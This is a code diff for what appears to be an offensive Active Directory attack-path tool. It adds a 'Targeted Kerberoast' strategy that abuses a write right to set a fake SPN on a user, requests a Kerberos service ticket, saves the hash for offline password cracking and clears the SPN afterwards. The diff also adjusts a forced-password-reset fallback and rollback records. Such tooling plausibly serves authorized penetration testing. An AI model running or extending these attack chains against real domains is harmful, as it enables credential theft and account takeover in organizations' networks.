@@ -186,7 +186,15 @@ class GenericAllHandler(BaseEdgeHandler):
            any ACL edge that can write ``msDS-KeyCredentialLink``.
         2. **bloodyAD Shadow Credentials** — fallback implementation for
            the same attack.  Tries when certipy is unavailable or fails.
-        3. **Force password reset** — only attempted when the edge type
+        3. **Targeted Kerberoast (bloodyAD set SPN + impacket TGS)** —
+           non-PKINIT fallback that works against DCs lacking a KDC
+           certificate.  Sets a fake SPN on the target via bloodyAD's
+           GenericWrite primitive, requests a TGS for it, then clears
+           the SPN.  The captured TGS-REP hash is saved to
+           ``~/.pathstrike/kerberoast/`` for offline cracking; the
+           operator must crack it and re-run with the recovered
+           password before the chain can continue.
+        4. **Force password reset** — only attempted when the edge type
            grants the ``User-Force-Change-Password`` extended right
            (GenericAll, Owns, ForceChangePassword, AllExtendedRights).
            Skipped for GenericWrite / WriteDacl / WriteProperty because
@@ -298,10 +306,45 @@ class GenericAllHandler(BaseEdgeHandler):
         strategy_errors.append(f"bloodyAD shadow creds: {err}")
         self.logger.warning("bloodyAD shadow creds failed on %s: %s", target, err)
 
-        # -------- Strategy 3: Force password reset (gated on edge type) ---
+        # -------- Strategy 3: Targeted Kerberoast ------------------------
+        # Non-PKINIT fallback.  When both shadow-creds variants fail (most
+        # often because the DC has no KDC cert installed and PKINIT is
+        # therefore unavailable), we can still abuse the same write right
+        # to set a fake SPN, request a TGS, and clean up.  The operator
+        # must crack the TGS-REP hash offline before the chain continues.
+        self.logger.debug(
+            "[Strategy 3/4] Targeted Kerberoast on user %s", target,
+        )
+        # Local import to avoid pulling extended_access at module load
+        # (its other handlers register edges we don't depend on here).
+        from pathstrike.handlers.extended_access import (
+            perform_targeted_kerberoast,
+        )
+        kr_success, kr_msg, kr_creds, leftover_spn = (
+            await perform_targeted_kerberoast(
+                self.config,
+                self.cred_store,
+                principal,
+                target,
+                auth_args,
+                self.logger,
+            )
+        )
+        # If cleanup failed mid-flow, remember the leftover SPN so
+        # get_rollback_action can record a clear-SPN entry.
+        if leftover_spn:
+            self._kerberoast_leftover_spn = leftover_spn
+            self._kerberoast_target = target
+        if kr_success:
+            self._successful_strategy = "targeted_kerberoast"
+            return True, kr_msg, kr_creds
+        strategy_errors.append(f"Targeted Kerberoast: {kr_msg}")
+        self.logger.warning("Targeted Kerberoast failed on %s: %s", target, kr_msg)
+
+        # -------- Strategy 4: Force password reset (gated on edge type) ---
         if edge_type_lower in self._PASSWORD_RESET_CAPABLE_EDGES:
             self.logger.debug(
-                "[Strategy 3/3] Force password reset on %s (disruptive)", target,
+                "[Strategy 4/4] Force password reset on %s (disruptive)", target,
             )
             new_pass = _generate_password()
             result = await bloody.set_password(
@@ -537,7 +580,45 @@ class GenericAllHandler(BaseEdgeHandler):
 
         match edge.target.label.lower():
             case "user":
-                # Shadow creds: could remove KeyCredentialLink; password change is not reversible
+                strategy = self._successful_strategy
+                # Targeted Kerberoast clears its own SPN inline; only
+                # produce a rollback when bloodyAD's clear failed and we
+                # left an SPN behind.  In that case, target whatever
+                # user the leftover applied to (cached on the handler).
+                if strategy == "targeted_kerberoast":
+                    leftover = getattr(self, "_kerberoast_leftover_spn", None)
+                    if not leftover:
+                        return None
+                    spn_target = getattr(self, "_kerberoast_target", target)
+                    return RollbackAction(
+                        step_index=0,
+                        action_type="clear_spn",
+                        description=(
+                            f"Clear servicePrincipalName on '{spn_target}' "
+                            f"(leftover after Kerberoast cleanup-failure: "
+                            f"'{leftover}')"
+                        ),
+                        command=(
+                            f"bloodyAD set object {spn_target} "
+                            f"servicePrincipalName"
+                        ),
+                        reversible=True,
+                    )
+                if strategy == "password_reset":
+                    # Password reset is not reversible without the prior
+                    # hash.  Surface an informational rollback entry.
+                    return RollbackAction(
+                        step_index=0,
+                        action_type="password_reset_manual",
+                        description=(
+                            f"Password reset on '{target}' — cannot be "
+                            f"auto-reverted; original password is unknown."
+                        ),
+                        command=f"# manual cleanup required for {target}",
+                        reversible=False,
+                    )
+                # Default: shadow-creds variants (or pre-execution
+                # planning) — best-effort remove the KeyCredentialLink.
                 return RollbackAction(
                     step_index=0,
                     action_type="remove_key_credential",
